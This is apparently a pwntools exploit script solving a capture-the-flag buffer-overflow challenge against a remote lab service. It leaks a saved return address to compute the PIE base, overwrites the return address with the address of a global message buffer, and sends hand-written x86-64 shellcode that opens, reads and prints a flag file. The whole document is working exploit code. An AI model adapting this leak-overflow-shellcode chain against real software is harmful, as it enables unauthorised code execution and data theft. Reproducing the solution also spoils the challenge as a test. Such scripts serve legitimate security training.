#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

REMOTE = ('up.zoolab.org', 12342)
elf = ELF('./bof1')  # or './chal2' or the remote-provided binary

msg_addr = elf.symbols['msg']
print(f"[+] msg virtual addr  = {hex(msg_addr)}")


#r = process('./bof1')
r = remote(*REMOTE)

r.recvuntil(b"name? ")
r.sendline(b"A" * 55)  #sendline end with \n 


welcome = r.recvuntil(b"\nWhat's the room number?")

raw = welcome.split(b"Welcome, ")[1]  
lines = raw.split(b"\n")
payload_line = lines[0]              # AAAAAAA... 
leak_line = lines[1]                 # return address bytes 

saved_rip = leak_line[:6]            # 6 bytes 
addr = u64(saved_rip.ljust(8, b"\x00"))

pie = addr - 0x9c99

print(f"[DEBUG] wel = {welcome!r}")
print(f"[DEBUG] lines = {lines!r}")
print(f"[DEBUG] payl = {leak_line!r}")
log.success(f"leak  = {hex(addr)}")
log.success(f"PIE   = {hex(pie)}")





msg_rt = pie + 0xef220
log.success(f"msg@  = {hex(msg_rt)}")
#buf2
r.sendline(b"101")
#buf3
r.recvuntil(b"customer's name? ")

payload = b"A" * (56+48+48)   + p64(msg_rt)

r.sendline(payload)


r.recvuntil(b"Leave your message: ")

shellcode = asm("""
    xor rax, rax
    mov rbx, 0x47414c462f      
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2                
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax              
    syscall

    mov rdi, 1
    mov rax, 1                
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
""")

r.send(shellcode)

# show flag
r.interactive()
